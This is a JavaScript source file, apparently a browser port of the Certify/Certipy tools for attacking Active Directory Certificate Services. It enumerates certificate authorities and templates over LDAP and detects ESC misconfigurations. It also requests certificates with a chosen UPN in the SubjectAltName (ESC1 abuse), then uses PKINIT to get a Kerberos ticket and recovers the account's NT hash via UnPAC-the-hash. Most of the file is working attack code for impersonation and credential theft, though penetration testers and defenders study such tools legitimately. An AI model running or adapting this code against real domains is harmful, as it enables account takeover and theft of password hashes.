// Certify (browser port): AD CS enumeration + ESC misconfiguration discovery over
// LDAP, using the same hand-rolled LDAP/Kerberos/TLS stack as the other tools.
// Modes: find (everything), vulnerable (only findings), cas, templates.

import { LdapBhClient } from './ldap/source.js';
import { discoverConfigNC, enumerateCAs, enumerateTemplates, resolveSid, first } from './adcs/enum.js';
import { analyzeTemplate, templateEscs, analyzeCA, caEscs } from './adcs/esc.js';
import { wellKnownName, EKU_NAME } from './adcs/constants.js';
import { buildCsr, pem } from './adcs/pkcs10.js';
import { requestCertificate, extractLeafCert } from './adcs/icpr.js';
import { b64ToBytes } from './security/sid.js';
import { getTgtPkinit } from './kerberos/pkinit.js';
import { unpacHash } from './kerberos/unpac.js';
import { KdcSocketTransport } from './kerberos/client.js';

const ekuName = (oid) => EKU_NAME[oid] || oid;

export async function run(config, hooks = {}) {
  const log = hooks.log || (() => {});

  const client = new LdapBhClient(log);
  await client.connect(config.host, config.port || (config.tls ? 636 : 389), {
    authMethod: config.authMethod || 'ntlm',
    bindDN: config.bindDN, user: config.user || config.bindDN,
    domain: config.domain, kdc: config.kdc, hash: config.hash,
    tls: config.tls, sni: config.host, password: config.password,
  });

  try {
    const configNC = config.configNC || await discoverConfigNC(client);
    if (!configNC) throw new Error('Could not determine the configuration naming context.');
    log(`Configuration NC: ${configNC}`);

    const caObjs = await enumerateCAs(client, configNC);
    const tplObjs = await enumerateTemplates(client, configNC);
    log(`Enumerated ${caObjs.length} CA(s) and ${tplObjs.length} certificate template(s).`);

    const cas = caObjs.map((o) => { const c = analyzeCA(o); return { ...c, escs: caEscs(c) }; });
    const templates = tplObjs.map((o) => { const t = analyzeTemplate(o); return { t, escs: templateEscs(t) }; });

    // A template is "enabled" when it's published (issued) by at least one CA.
    const published = new Set(cas.flatMap((c) => c.templates.map((x) => x.toLowerCase())));
    const isEnabled = (t) => published.has((t.name || '').toLowerCase());

    // Collect findings and resolve the principal SIDs to names for display.
    let findings = [];
    for (const c of cas) for (const e of c.escs) findings.push({ scope: 'CA', object: c.name, enabled: true, ...e });
    for (const { t, escs } of templates) for (const e of escs) findings.push({ scope: 'Template', object: t.display || t.name, enabled: isEnabled(t), ...e });
    for (const f of findings) {
      f.principalNames = [];
      for (const sid of f.principals || []) f.principalNames.push(`${await resolveSid(client, sid, wellKnownName)} (${sid})`);
    }
    log(`ESC analysis: ${findings.length} finding(s).`);

    // Shape rows for the UI / CLI.
    let templateRows = [];
    for (const { t, escs } of templates) {
      const enrollNames = [];
      for (const sid of t.acl.enroll) enrollNames.push(await resolveSid(client, sid, wellKnownName));
      templateRows.push({
        name: t.display || t.name, cn: t.name, enabled: isEnabled(t), schema: t.schema,
        clientAuth: t.clientAuth, suppliesSubject: t.suppliesSubject,
        managerApproval: t.managerApproval || t.requiresSignatures,
        ekus: t.ekus.map(ekuName), enrollees: enrollNames,
        escs: escs.map((e) => e.id),
      });
    }
    const caRows = cas.map((c) => ({ name: c.name, dns: c.dns, templates: c.templates.length, webEnroll: c.enrollmentServers.length > 0, escs: c.escs.map((e) => e.id) }));

    // `enabled` (Certipy -enabled): keep only published templates (CA findings stay).
    if (config.enabled) {
      templateRows = templateRows.filter((r) => r.enabled);
      findings = findings.filter((f) => f.scope === 'CA' || f.enabled);
    }

    return {
      mode: config.mode || 'find',
      summary: { CAs: cas.length, templates: config.enabled ? templateRows.length : templates.length, findings: findings.length },
      configNC, findings, templateRows, caRows,
    };
  } finally {
    await client.close();
    log('Connection closed.');
  }
}

// Request a certificate from a CA via MS-ICPR. config: { caHost, caName, template,
// subject, altUpn, altDns, user, domain, password }. altUpn/altDns drive the ESC1
// SubjectAltName. Returns { disposition, dispositionText, certPem, keyPem, … }.
export async function requestCert(config, hooks = {}) {
  const log = hooks.log || (() => {});
  const { csr, pkcs8 } = await buildCsr({
    subject: config.subject || 'CN=User',
    upns: config.altUpn ? [config.altUpn] : [],
    dnsNames: config.altDns ? [config.altDns] : [],
  });
  log(`Built PKCS#10 CSR — subject ${config.subject || 'CN=User'}${config.altUpn ? `, SAN otherName:UPN=${config.altUpn}` : ''}.`);
  const creds = { user: config.user || config.bindDN, domain: config.domain, password: config.password };
  const res = await requestCertificate(config.caHost, creds, { caName: config.caName, template: config.template, csr, log });
  log(`Disposition: ${res.dispositionText} (requestId ${res.requestId})${res.message ? ` — ${res.message}` : ''}`);
  let certPem = null;
  if (res.disposition === 3 && res.cert && res.cert.length) {
    const leaf = extractLeafCert(res.cert);
    log(`Certificate issued: PKCS#7 ${res.cert.length}B, leaf ${leaf.length}B.`);
    certPem = pem('CERTIFICATE', leaf);
  }
  return { ...res, certPem, keyPem: pem('PRIVATE KEY', pkcs8) };
}

const pemToDer = (p) => b64ToBytes(p.replace(/-----[^-]+-----|\s/g, ''));

// certipy auth: authenticate to the KDC with a certificate (PKINIT) to get a TGT,
// and (unpac) recover the account's NT hash via UnPAC-the-hash. config supplies a
// { certPem, keyPem } pair, or the parameters to request one first.
export async function authenticate(config, hooks = {}) {
  const log = hooks.log || (() => {});
  let { certPem, keyPem } = config;
  if (!certPem) {
    const req = await requestCert(config, { log });
    if (!req.certPem) throw new Error(`certificate request failed: ${req.dispositionText}`);
    certPem = req.certPem; keyPem = req.keyPem;
  }
  const certDer = pemToDer(certPem);
  const privateKey = await globalThis.crypto.subtle.importKey('pkcs8', pemToDer(keyPem), { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['sign']);
  const transport = new KdcSocketTransport(config.kdc || config.host, 88, log);
  await transport.connect();
  try {
    const tgt = await getTgtPkinit(transport, { username: config.user, realm: config.domain, certDer, privateKey, log });
    let ntHash = null;
    if (config.unpac !== false) ntHash = (await unpacHash(transport, tgt, log)).ntHash;
    return { ok: true, username: config.user, realm: config.domain, sessionKeyEtype: tgt.sessionKey.etype, ntHash, certPem, keyPem };
  } finally {
    await transport.close();
  }
}
